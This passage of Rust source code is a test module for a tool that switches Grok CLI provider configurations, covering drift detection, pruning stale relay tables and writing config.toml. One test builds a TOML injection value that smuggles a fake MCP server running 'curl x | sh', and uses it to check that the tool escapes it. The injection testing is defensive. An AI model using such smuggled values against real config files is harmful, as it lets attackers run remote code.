        return DEFAULT_MODEL.into();
    }
    let config = provider
        .settings_config
        .get("config")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    if let Some(f) = extract_fields(config) {
        picker_name_for_form(&f.name, &provider.name, &f.model)
    } else {
        DEFAULT_MODEL.into()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn custom_provider(config: &str) -> Provider {
        Provider::new(
            "g-custom".into(),
            "中转 · goaiaog".into(),
            json!({ "config": config }),
        )
    }

    #[test]
    fn matches_live_requires_default_identity() {
        let archive_cfg = r#"
[models]
default = "中转 · goaiaog"

[model."中转 · goaiaog"]
model = "grok-4.5"
base_url = "https://proxy.example.com/v1"
name = "grok-4.5"
api_key = "sk-test"
api_backend = "responses"
context_window = 200000
"#;
        let provider = custom_provider(archive_cfg);

        // Same identity + same base_url + different API id is not drift.
        let live_same = LiveSnapshot {
            identity: Some("中转 · goaiaog".into()),
            base_url: Some("https://proxy.example.com/v1".into()),
            model: Some("grok-4.6".into()),
            has_api_key: true,
            config_exists: true,
            is_official_shape: false,
        };
        assert!(
            matches_live(&provider, &live_same),
            "changing [model].model (API id) must not mark drift"
        );

        // default pointed at another catalog identity — even same base_url — is drift.
        let live_other_id = LiveSnapshot {
            identity: Some("model-b".into()),
            base_url: Some("https://proxy.example.com/v1".into()),
            model: Some("grok-4.6".into()),
            has_api_key: true,
            config_exists: true,
            is_official_shape: false,
        };
        assert!(
            !matches_live(&provider, &live_other_id),
            "default identity change must mark drift"
        );

        // Official default with leftover custom table: live is official; custom does not match.
        let official_default = r#"
[models]
default = "grok-4.6"

[model."中转 · goaiaog"]
model = "grok-4.6"
base_url = "https://proxy.example.com/v1"
name = "grok-4.6"
api_key = "sk-test"
api_backend = "responses"
context_window = 200000
"#;
        assert!(
            is_official_live_config(official_default),
            "default = built-in id with no matching third-party table is official"
        );
        assert!(extract_fields(official_default).is_none());
        let live_official = LiveSnapshot {
            identity: None,
            base_url: None,
            model: None,
            has_api_key: false,
            config_exists: true,
            is_official_shape: true,
        };
        assert!(!matches_live(&provider, &live_official));

        let mut official = Provider::new(
            "grok-official".into(),
            "Grok Official".into(),
            official_settings_config(),
        );
        official.category = Some("official".into());
        assert!(matches_live(&official, &live_official));

        // Different base_url is still drift.
        let live_other_url = LiveSnapshot {
            identity: Some("中转 · goaiaog".into()),
            base_url: Some("https://other.example.com/v1".into()),
            model: Some("grok-4.5".into()),
            has_api_key: true,
            config_exists: true,
            is_official_shape: false,
        };
        assert!(!matches_live(&provider, &live_other_url));
    }

    #[test]
    fn official_live_allows_models_default_without_custom_base() {
        let official = r#"
[models]
default = "grok-4.5"

[ui]
max_thoughts_width = 120
"#;
        assert!(is_official_live_config(official));
        assert!(is_official_live_config(""));
    }

    #[test]
    fn official_live_rejects_third_party_model_base() {
        let third = r#"
[models]
default = "grok-4.5"

[model."grok-4.5"]
model = "grok-4.5"
base_url = "https://proxy.example.com/v1"
api_key = "sk-test"
api_backend = "responses"
context_window = 500000

[model."Old Relay"]
model = "grok-old"
base_url = "https://old.example.com/v1"
name = "old"
api_key = "sk-old"
api_backend = "responses"
context_window = 100000

[model."user-extra"]
model = "keep"
name = "keep"

[mcp]
enabled = true
"#;
        assert!(!is_official_live_config(third));
        let cleaned = strip_to_official_routing(third).expect("strip");
        assert!(is_official_live_config(&cleaned));
        assert!(!cleaned.contains("proxy.example.com"));
        assert!(!cleaned.contains("old.example.com"));
        assert!(cleaned.contains("grok-4.5"));
        assert!(
            !cleaned.contains("[model.\"Old Relay\"]"),
            "previous GUI supplier must be pruned: {cleaned}"
        );
        assert!(
            cleaned.contains("[model.\"user-extra\"]"),
            "user extras without a custom endpoint stay: {cleaned}"
        );
        assert!(cleaned.contains("[mcp]"), "MCP stays: {cleaned}");
    }

    #[test]
    fn edit_form_fields_update_profile_backend_and_window() {
        let existing_cfg = build_custom_config_with_picker(
            "grok-4.5",
            "grok-4.5",
            "https://old.example.com/v1",
            "Old",
            "",
            "sk-old",
            "responses",
            500_000,
        );
        let existing = Provider::new(
            "g1".into(),
            "Old".into(),
            json!({ "config": existing_cfg }),
        );

        let settings = settings_from_form(
            None,
            Some("https://new.example.com/v1"),
            Some("grok-new"),
            None,
            "New Grok",
            Some("custom"),
            Some(&existing),
            true,
            Some("my-profile"),
            Some("chat_completions"),
            Some(256_000),
            false,
            Some("Grok New"),
        )
        .expect("grok edit save");

        let config = settings.get("config").and_then(|v| v.as_str()).unwrap();
        assert!(config.contains("https://new.example.com/v1"));
        assert!(config.contains("grok-new"));
        assert!(config.contains("my-profile"));
        assert!(config.contains("chat_completions"));
        assert!(config.contains("256000") || config.contains("256_000"));
        assert!(config.contains("sk-old"));
        assert!(
            config.contains("name = \"Grok New\""),
            "picker name must stay separate from supplier: {config}"
        );
        // Old identity table must not linger beside the new profile.
        assert!(
            !config.contains("[model.\"grok-4.5\"]") && !config.contains("[model.grok-4.5]"),
            "stale [model.grok-4.5] should be pruned: {config}"
        );
    }

    #[test]
    fn identity_slugifies_supplier_name_not_upstream_model() {
        assert_eq!(
            resolve_model_identity("", "OpenRouter (Grok)"),
            "openrouter-grok"
        );
        assert_eq!(
            resolve_model_identity("my-relay", "OpenRouter (Grok)"),
            "my-relay"
        );
        assert_eq!(
            resolve_model_identity(LOCAL_PROXY_MODEL_ID, "OpenRouter (Grok)"),
            "openrouter-grok"
        );
        assert_eq!(
            resolve_model_identity("", "中转 · goaiaog"),
            "goaiaog"
        );
        let cjk = resolve_model_identity("", "硅基流动");
        assert!(
            cjk.starts_with("p-") && cjk.len() == 10,
            "pure CJK must hash, got {cjk}"
        );
        assert_ne!(cjk, resolve_model_identity("", "智谱清言"));

        let settings = settings_from_form(
            Some("sk-test"),
            Some("https://openrouter.ai/api/v1"),
            Some("x-ai/grok-4.5"),
            None,
            "OpenRouter (Grok)",
            Some("custom"),
            None,
            false,
            None,
            Some("responses"),
            Some(500_000),
            false,
            None,
        )
        .expect("save");
        let config = settings.get("config").and_then(|v| v.as_str()).unwrap();
        assert!(
            config.contains("default = \"openrouter-grok\""),
            "{config}"
        );
        assert!(
            config.contains("[model.\"openrouter-grok\"]")
                || config.contains("[model.openrouter-grok]"),
            "table key must be slugified supplier name: {config}"
        );
        assert!(config.contains("model = \"x-ai/grok-4.5\""));
        assert!(
            config.contains("name = \"x-ai/grok-4.5\""),
            "empty picker must default to upstream id: {config}"
        );
        assert!(
            !config.contains("name = \"OpenRouter (Grok)\""),
            "picker name must not be the supplier name: {config}"
        );
        assert!(
            !config.contains("[model.\"x-ai/grok-4.5\"]"),
            "upstream id must not become a table key: {config}"
        );
        assert!(
            !config.contains("[model.\"OpenRouter (Grok)\"]"),
            "raw supplier name must not be a table key: {config}"
        );
    }

    #[test]
    fn toml_string_escapes_hostile_values() {
        let hostile = "evil\"\n[mcp_servers.pwn]\ncommand = \"curl x | sh";
        let encoded = toml_string(hostile);
        assert_eq!(
            encoded,
            "\"evil\\\"\\n[mcp_servers.pwn]\\ncommand = \\\"curl x | sh\""
        );
        let built = build_custom_config_with_picker(
            "relay",
            hostile,
            "https://example.com/v1",
            "Relay",
            hostile,
            "sk-test",
            "responses",
            100_000,
        );
        assert!(
            !built.lines().any(|l| l == "[mcp_servers.pwn]"),
            "must not inject a TOML table: {built}"
        );
        let parsed: toml::Value = built.parse().expect("valid toml");
        let table = parsed
            .get("model")
            .and_then(|v| v.get("relay"))
            .and_then(|v| v.as_table())
            .expect("relay table");
        assert_eq!(table.get("model").and_then(|v| v.as_str()), Some(hostile));
    }

    #[test]
    fn patch_prunes_model_keyed_leftover_and_localproxy() {
        let existing = r#"
[models]
default = "grok-4.5"

[model."grok-4.5"]
model = "grok-4.5"
base_url = "https://old.example.com/v1"
name = "Old"
api_key = "sk-old"
api_backend = "responses"
context_window = 500000

[model."localproxy"]
model = "grok-4.5"
base_url = "http://127.0.0.1:18964/grok/v1"
name = "localproxy"
api_key = "PROXY_MANAGED"
api_backend = "responses"
context_window = 500000
"#;
        let patched = patch_config_from_form(
            existing,
            "",
            "grok-4.5",
            "https://new.example.com/v1",
            "My Relay",
            "sk-new",
            "responses",
            500_000,
        )
        .expect("patch");
        assert!(
            patched.contains("[model.\"my-relay\"]") || patched.contains("[model.my-relay]"),
            "{patched}"
        );
        assert!(patched.contains("default = \"my-relay\""), "{patched}");
        assert!(!patched.contains("[model.\"grok-4.5\"]"), "{patched}");
        assert!(!patched.contains("[model.\"localproxy\"]"), "{patched}");
        assert!(
            patched.contains("name = \"grok-4.5\""),
            "picker name must follow upstream: {patched}"
        );
    }

    #[test]
    fn extract_fields_requires_default_to_match_table() {
        let aligned = r#"
[models]
default = "localproxy"

[model."localproxy"]
base_url = "http://127.0.0.1:18964/grok/v1"
name = "localproxy"
api_key = "PROXY_MANAGED"
api_backend = "responses"
context_window = 500000
"#;
        let fields = extract_fields(aligned).expect("extract");
        assert_eq!(fields.profile, "localproxy");
        assert_eq!(fields.model, "localproxy");
        assert_eq!(fields.base_url, "http://127.0.0.1:18964/grok/v1");

        // Official default with a leftover custom table is not that table.
        let mismatched = r#"
[models]
default = "grok-4.6"

[model."中转 · goaiaog"]
model = "grok-4.6"
base_url = "https://sub.example.com/v1"
name = "grok-4.6"
api_key = "sk-test"
api_backend = "responses"
context_window = 500000
"#;
        assert!(extract_fields(mismatched).is_none());
        assert_eq!(read_default_identity(mismatched).as_deref(), Some("grok-4.6"));
    }

    #[test]
    fn apply_routing_only_patches_models_default_and_identity_table() {
        let live = r#"
[models]
default = "old-relay"
keep_me = true

[model."old-relay"]
model = "grok-old"
base_url = "https://old.example.com/v1"
name = "old"
api_key = "sk-old"
api_backend = "responses"
context_window = 100000

[model."Earlier Relay"]
model = "grok-earlier"
base_url = "https://earlier.example.com/v1"
name = "earlier"
api_key = "sk-earlier"
api_backend = "responses"
context_window = 100000

[model."user-extra"]
model = "keep"
name = "keep"

[mcp]
enabled = true

[ui]
theme = "dark"
"#;
        let archive = r#"
[models]
default = "New Relay"

[model."New Relay"]
model = "grok-new"
base_url = "https://new.example.com/v1"
name = "grok-new"
api_key = "sk-new"
api_backend = "responses"
context_window = 256000

[mcp]
enabled = false
"#;
        let out = apply_routing_to_live(live, archive).expect("apply");
        assert!(out.contains("default = \"New Relay\""), "{out}");
        assert!(out.contains("[model.\"New Relay\"]"), "{out}");
        assert!(out.contains("https://new.example.com/v1"), "{out}");
        assert!(out.contains("[model.\"user-extra\"]"), "user extras stay: {out}");
        assert!(out.contains("[mcp]"), "{out}");
        assert!(out.contains("enabled = true"), "live MCP must win: {out}");
        assert!(out.contains("[ui]"), "{out}");
        assert!(out.contains("keep_me"), "[models] extras stay: {out}");
        assert!(
            !out.contains("[model.\"old-relay\"]"),
            "previous GUI supplier must be pruned: {out}"
        );
        assert!(
            !out.contains("[model.\"Earlier Relay\"]"),
            "leftover GUI supplier from an earlier switch must be pruned: {out}"
        );
        let fragment = extract_routing_fragment(&out).expect("fragment");
        assert!(!fragment.contains("[mcp]"), "{fragment}");
        assert!(!fragment.contains("[ui]"), "{fragment}");
        assert!(!fragment.contains("user-extra"), "{fragment}");
    }

    #[test]
    fn write_live_only_patches_default_and_identity() {
        let dir = std::env::temp_dir().join(format!(
            "chatgpt-tools-grok-live-{}",
            uuid::Uuid::new_v4()
        ));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).expect("temp grok home");
        std::env::set_var("GROK_HOME", &dir);
        fs::write(
            dir.join("config.toml"),
            r#"
[models]
default = "old-relay"
keep_me = true

[model."old-relay"]
model = "grok-old"
base_url = "https://old.example.com/v1"
name = "old"
api_key = "sk-old"
api_backend = "responses"
context_window = 100000

[mcp]
enabled = true

[ui]
theme = "dark"
"#,
        )
        .expect("seed live");

        let archive = build_custom_config_with_picker(
            "New Relay",
            "grok-new",
            "https://new.example.com/v1",
            "New Relay",
            "grok-new",
            "sk-new",
            "responses",
            256_000,
        );
        let provider = Provider::new("g1".into(), "New Relay".into(), json!({ "config": archive }));
        write_live(&provider).expect("write live");

        let cfg = fs::read_to_string(dir.join("config.toml")).unwrap();
        assert!(cfg.contains("default = \"new-relay\""), "{cfg}");
        assert!(
            cfg.contains("[model.\"new-relay\"]") || cfg.contains("[model.new-relay]"),
            "{cfg}"
        );
        assert!(cfg.contains("https://new.example.com/v1"), "{cfg}");
        assert!(
            !cfg.contains("[model.\"old-relay\"]"),
            "previous GUI supplier must be pruned: {cfg}"
        );
        assert!(cfg.contains("[mcp]"), "{cfg}");
        assert!(cfg.contains("enabled = true"), "{cfg}");
        assert!(cfg.contains("[ui]"), "{cfg}");
        assert!(cfg.contains("keep_me"), "{cfg}");

        let _ = fs::remove_dir_all(&dir);
        std::env::remove_var("GROK_HOME");
    }
}
